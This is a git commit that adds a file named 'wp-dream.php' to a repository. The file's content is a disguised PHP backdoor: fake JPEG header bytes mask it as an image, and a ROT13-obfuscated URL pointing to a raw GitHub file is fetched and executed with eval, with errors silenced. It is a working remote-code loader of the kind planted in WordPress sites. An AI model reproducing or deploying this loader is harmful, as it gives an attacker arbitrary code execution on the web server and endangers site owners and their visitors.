1dccd021cbf2a4ef8270368593f154d39f28b83f
foggit <mrgithub89@gmail.com>
2025-04-17 13:42:28 +0600

    Add files via upload

---
+++ wp-dream.php
@@ -0,0 +1,4 @@
+ÿØÿà JFIF  ` `  ÿá²Exif  MM *    ‡i      2ê       &    ê        ÿØÿà JFIF  ` `  ÿá²Exif  MM *    ‡i      2ê       &    ê        ÿØÿà JFIF  ` `  ÿá²Exif  MM *    ‡i      2ê       &    ê        
+<?php
+@eval("?>" . @file_get_contents(str_rot13("uggcf://enj.tvguhohfrepbagrag.pbz/sbttvg/ffff/ersf/urnqf/znva/jc-mzme.cuc")));
+?>
